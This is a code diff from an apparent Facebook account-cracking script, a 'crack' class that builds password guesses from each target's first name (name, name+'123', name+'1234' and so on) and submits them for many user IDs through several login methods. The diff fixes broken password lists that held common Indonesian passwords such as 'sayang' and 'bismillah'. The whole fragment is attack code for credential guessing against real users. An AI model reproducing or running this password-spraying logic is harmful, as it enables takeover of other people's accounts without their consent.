@@ -644,13 +644,13 @@ class crack:
 					sempak = name.split(' ')
 					nun = sempak[0]
 					if len(nun)>=6:
-						pwx = [nun, nun+'123', nun+'1234', nun+'12345', name', sayang', sayang123', bismillah', katasandi]
+						pwx = [nun, nun+'123', nun+'1234', nun+'12345', name]
 					elif len(nun)<=2:
-						pwx = [nun, nun+'123', nun+'1234', nun+'12345', name', sayang', sayang123', bismillah', katasandi]
+						pwx = [nun, nun+'123', nun+'1234', nun+'12345', name]
 					elif len(nun)<=5:
-						pwx = [nun, nun+'123', nun+'1234', nun+'12345', name', sayang', sayang123', bismillah', katasandi]
+						pwx = [nun, nun+'123', nun+'1234', nun+'12345', name]
 					else:
-						pwx = [nun, nun+'123', nun+'1234', nun+'12345', name', sayang', sayang123', bismillah', katasandi]
+						pwx = [nun, nun+'123', nun+'1234', nun+'12345', name]
 					dihi.submit(self.b_api, uid, pwx)
 				except Exception as e:os.sys.exit(e)
 				except:pass
@@ -667,13 +667,13 @@ class crack:
 					sempak = name.split(' ')
 					nun = sempak[0]
 					if len(nun)>=6:
-						pwx = [nun, nun+'123', nun+'1234', nun+'12345', name', sayang', sayang123', bismillah', katasandi]
+						pwx = [nun, nun+'123', nun+'1234', nun+'12345', name]
 					elif len(nun)<=2:
-						pwx = [nun, nun+'123', nun+'1234', nun+'12345', name', sayang', sayang123', bismillah', katasandi]
+						pwx = [nun, nun+'123', nun+'1234', nun+'12345', name]
 					elif len(nun)<=5:
-						pwx = [nun, nun+'123', nun+'1234', nun+'12345', name', sayang', sayang123', bismillah', katasandi]
+						pwx = [nun, nun+'123', nun+'1234', nun+'12345', name]
 					else:
-						pwx = [nun, nun+'123', nun+'1234', nun+'12345', name', sayang', sayang123', bismillah', katasandi]
+						pwx = [nun, nun+'123', nun+'1234', nun+'12345', name]
 					dihi.submit(self.mbasic, uid, pwx)
 				except Exception as e:os.sys.exit(e)
 				except:pass
@@ -691,13 +691,13 @@ class crack:
 					gas = name.split(' ')
 					nun = gas[0]
 					if len(nun)>=6:
-						pwx = [nun, nun+'123', nun+'1234', nun+'12345', name', sayang', sayang123', bismillah', katasandi]
+						pwx = [nun, nun+'123', nun+'1234', nun+'12345', name]
 					elif len(nun)<=2:
-						pwx = [nun, nun+'123', nun+'1234', nun+'12345', name', sayang', sayang123', bismillah', katasandi]
+						pwx = [nun, nun+'123', nun+'1234', nun+'12345', name]
 					elif len(nun)<=5:
-						pwx = [nun, nun+'123', nun+'1234', nun+'12345', name', sayang', sayang123', bismillah', katasandi]
+						pwx = [nun, nun+'123', nun+'1234', nun+'12345', name]
 					else:
-						pwx = [nun, nun+'123', nun+'1234', nun+'12345', name', sayang', sayang123', bismillah', katasandi]
+						pwx = [nun, nun+'123', nun+'1234', nun+'12345', name]
 					dihi.submit(self.metod2, uid, pwx)
 				except Exception as e:os.sys.exit(e)
 				except:pass
